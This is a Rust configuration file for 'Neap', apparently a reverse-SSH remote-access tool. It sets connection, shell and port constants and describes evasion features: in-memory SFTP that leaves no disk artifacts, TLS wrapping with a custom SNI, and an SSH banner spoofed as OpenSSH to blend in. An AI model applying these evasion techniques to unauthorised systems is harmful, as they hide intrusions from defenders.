//! Compile-time configuration constants.
//!
//! Values are injected by `build.rs` from environment variables.
//! Defaults match Undertow's for drop-in compatibility.

/// Authentication password for SSH connections.
pub const PASSWORD: &str = env!("NEAP_PASSWORD");
/// Authorized SSH public key (empty = disabled).
pub const PUBKEY: &str = env!("NEAP_PUBKEY");
/// Default shell to spawn for PTY sessions.
pub const DEFAULT_SHELL: &str = env!("NEAP_SHELL");
/// Username for reverse SSH connections.
pub const LUSER: &str = env!("NEAP_LUSER");
/// Target host for reverse connections (empty = bind mode).
pub const LHOST: &str = env!("NEAP_LHOST");
/// SSH listening/connection port.
pub const LPORT: &str = env!("NEAP_LPORT");
/// Bind port after reverse connection (0 = random).
pub const BPORT: &str = env!("NEAP_BPORT");
/// When non-empty, disables runtime CLI parsing.
#[allow(dead_code)]
pub const NOCLI: &str = env!("NEAP_NOCLI");
/// When non-empty, enables in-memory SFTP (no disk artifacts).
pub const MEMFS: &str = env!("NEAP_MEMFS");
/// When non-empty, enables TLS wrapping.
pub const TLS_WRAP: &str = env!("NEAP_TLS_WRAP");
/// SNI hostname for TLS ClientHello.
pub const TLS_SNI: &str = env!("NEAP_TLS_SNI");
/// Neap version from Cargo.toml.
pub const VERSION: &str = env!("NEAP_VERSION");

/// SSH server version banner -- spoofed as OpenSSH to blend in.
pub const SSH_VERSION: &str = "OpenSSH_8.9";
